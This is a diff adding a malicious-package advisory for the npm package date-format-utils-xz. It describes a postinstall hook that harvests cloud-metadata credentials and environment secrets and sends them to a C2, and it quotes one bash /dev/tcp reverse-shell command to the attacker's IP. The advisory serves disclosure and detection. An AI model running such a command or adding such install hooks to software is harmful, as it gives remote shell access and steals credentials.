@@ -1,0 +1,129 @@
+{
+  "modified": "2026-07-24T06:45:34Z",
+  "published": "2026-07-21T00:00:00Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-11001",
+  "summary": "Malicious code in date-format-utils-xz (npm)",
+  "details": "The npm package `date-format-utils-xz` masquerades as a date-formatting utility but is malicious. Its own decoy `index.js` is prefaced with a Chinese comment translating to \"disguised as a normal date formatting tool.\"\n\nEvery published version (1.0.0-1.0.4) declares a `postinstall` lifecycle hook (`postinstall: node postinstall.js`) that runs automatically on `npm install`, before the package is imported, and the payload escalated across releases.\n\nVersions 1.0.0-1.0.3 are a cloud-metadata / environment harvester. The hook shells out with `curl` to the link-local cloud instance-metadata endpoints of the major providers -- Alibaba (100.100.100.200), AWS/GCP-style (169.254.169.254) and Tencent (metadata.tencentyun.com) -- to steal instance identity/roles and (on misconfigured instances) temporary cloud credentials, and runs `env` to dump the full process environment (CI secrets, cloud tokens, npm tokens). The data is exfiltrated by HTTP POST to an attacker-controlled C2 under paths /meta/ali, /meta/aws, /meta/tx, /meta/env (and /meta/all in 1.0.3); 1.0.0 is a lighter recon beacon (GET /pre?h={hostname}\u0026u={user}). The C2 migrated from the domain `zhijiujiu.cn` (1.0.0, 1.0.1) to the hard-coded IP `8.135.48.40` port 80 (1.0.2, 1.0.3) -- a domain-to-IP move that evades DNS-based blocking.\n\nVersion 1.0.4 escalated to a full REVERSE SHELL: postinstall.js opens a TCP connection to 8.135.48.40:4444 via Node net.connect and pipes a spawned /bin/sh over the socket, with fallbacks to `bash -i \u003e\u0026 /dev/tcp/8.135.48.40/4444 0\u003e\u00261` and a python3 pty shell; failures beacon to /shell/failed and /shell/error. This is interactive remote code execution on any host that installs the package.\n\nShortly after publishing 1.0.4 the operator unpublished the entire package from npm (all versions removed from the registry). Detected and classified independently by codelake Research from the live npm feed on 2026-07-21; not present in OSV or GHSA at the time of reporting (a first-catch). Versions 1.0.0-1.0.3 were archived by codelake before the unpublish; 1.0.4 was recovered from a public registry mirror that still cached it.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (4ed3237e0e3098910008ffa97c61cc346cdf252defb1f1ce8731316e4c394309)\nThe package advertises itself as a date-formatting utility but ships a postinstall.js that runs automatically on npm install and performs unrelated host reconnaissance and credential harvesting. postinstall.js executes recon commands (hostname, whoami, id, env, ifconfig, ls /, /proc/1/cgroup) via execSync, then curls cloud instance-metadata endpoints at 169.254.169.254 for AWS, Aliyun, and Tencent Cloud — which on cloud VMs return temporary IAM/role credentials — and POSTs the aggregated JSON over plain HTTP to the hardcoded IP 8.135.48.40 at path /meta/all. A comment in index.js explicitly labels the package as disguised as a normal date-formatting tool, confirming the cover-story shape. The env dump additionally exposes CI/build secrets typically held in environment variables.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "date-format-utils-xz"
+      },
+      "versions": [
+        "1.0.3",
+        "1.0.4",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "postinstall.js",
+              "sha256": "0600e9aaa57024bf73936f9bc4e23e59b5b397ad9c8260d51016659602eec5b9",
+              "tlsh": "d52100ed5e79ab70af6c8b64f0ec321a1521f8ca26059910626c0a760e8c53cf03cda6"
+            },
+            {
+              "path": "index.js",
+              "sha256": "47d5ef560237b5f8f4c08060ea19a3d340d5ea848828a793ac696ec493cf93f3",
+              "tlsh": "e8f028d168e62841632b70ad06870b5599a4f5032d1bf5f1bf0d4d184fcca4da25f7e4"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "date-format-utils-xz-1.0.3.tgz",
+              "hashes": {
+                "sha1": "3c64a263e7b80b6c81aca6751b09e0c6edcfa324",
+                "sha512_sri": "sha512-E75VYHJyKEg5NwCwmSEw8uGex7BRCjM4I/dxrdBi2LJJ0w8jsW1ytMl4t7X1w5bgWazsh53olVnWrhdPSaUF1Q=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/date-format-utils-xz/v/1.0.3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/date-format-utils-xz/v/1.0.4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://research.codelake.dev/advisories/clr-2026-3039-date-format-utils-xz"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    },
+    {
+      "name": "codelake Research",
+      "type": "FINDER",
+      "contact": [
+        "https://research.codelake.dev/advisories/clr-2026-3039-date-format-utils-xz"
+      ]
+    }
+  ],
+  "database_specific": {
+    "iocs": {
+      "domains": [
+        "zhijiujiu.cn"
+      ],
+      "hashes": [
+        "sha256:249f72604801ea2bdf436464ec0b8256f198f33d5d1f1ff8b92d507cd6e30a0c",
+        "sha256:b976e83c3b45962453580fa1c2b7f840f335cbede96832c089b1789bfeeb79c5",
+        "sha256:2adb1a22afb8fac18cf5ce68ebfd2fa1409faea7fef2807f3544cc9e6cd6a4b4",
+        "sha256:5d8278b7fa3ff1866f1361c7042c03ad0257e49d33072ed1698d2dd3864d1ec2",
+        "sha256:e7612d9538dfbd3e64b491f4c9c14387574e3a298a2d34dd453f75ca8f3a4ae2"
+      ],
+      "ips": [
+        "8.135.48.40"
+      ]
+    },
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "4ed3237e0e3098910008ffa97c61cc346cdf252defb1f1ce8731316e4c394309",
+        "import_time": "2026-07-22T20:59:16.579691553Z",
+        "id": "IN-MAL-2026-010851",
+        "modified_time": "2026-07-22T20:39:41Z",
+        "versions": [
+          "1.0.3"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "6c25b5f6a409f2c8ae349c23262edb84031c3626c268f6e075df9ff001d5370f",
+        "import_time": "2026-07-22T20:59:16.33799665Z",
+        "id": "IN-MAL-2026-010849",
+        "modified_time": "2026-07-22T20:39:24Z",
+        "versions": [
+          "1.0.4"
+        ]
+      }
+    ]
+  }
+}
